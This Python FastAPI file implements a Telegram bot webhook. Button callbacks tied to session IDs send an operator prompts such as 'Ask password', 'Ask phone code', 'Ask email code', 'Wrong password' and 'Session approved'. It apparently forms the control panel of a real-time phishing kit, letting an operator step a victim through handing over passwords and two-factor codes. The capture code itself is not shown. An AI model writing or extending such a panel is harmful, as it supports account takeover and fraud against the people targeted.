from fastapi import FastAPI, Request
import requests
import os
from telegram_service import telegram_service

app = FastAPI()

TELEGRAM_API = f"https://api.telegram.org/bot{os.getenv('TELEGRAM_BOT_TOKEN')}"


@app.post("/telegram_webhook")
async def telegram_webhook(req: Request):
    update = await req.json()

    # If button clicked
    if "callback_query" in update:
        cb = update["callback_query"]
        query_id = cb["id"]
        data = cb["data"]  # callback_data text
        chat_id = cb["message"]["chat"]["id"]

        # Acknowledge button click
        requests.post(
            f"{TELEGRAM_API}/answerCallbackQuery",
            json={"callback_query_id": query_id}
        )

        # NEW FORMAT: action_<session_id>_<actionType>
        try:
            # example: "action_123456_password"
            parts = data.split("_", 2)
            prefix = parts[0]            # "action"
            session_id = parts[1]        # "123456"
            action_type = parts[2]       # "password"
        except:
            return {"ok": False, "error": "Invalid callback format"}

        # Routing actions:
        if action_type == "password":
            return send_admin_action(chat_id, "🔐 Ask password", session_id)

        if action_type == "form":
            return send_admin_action(chat_id, "📝 Ask form again", session_id)

        if action_type == "phone_code":
            return send_admin_action(chat_id, "📱 Ask phone code", session_id)

        if action_type == "email_code":
            return send_admin_action(chat_id, "📧 Ask email code", session_id)

        if action_type == "wrong_password":
            return send_admin_action(chat_id, "❌ Wrong password", session_id)

        if action_type == "wrong_code":
            return send_admin_action(chat_id, "🚫 Wrong code", session_id)

        if action_type == "finish":
            return send_admin_action(chat_id, "✅ Session approved", session_id)

    return {"ok": True}


def send_admin_action(chat_id, text, session_id):
    """Send admin response on button click"""
    requests.post(
        f"{TELEGRAM_API}/sendMessage",
        json={
            "chat_id": chat_id,
            "text": f"{text}\nSession: {session_id}"
        }
    )
    return {"ok": True}
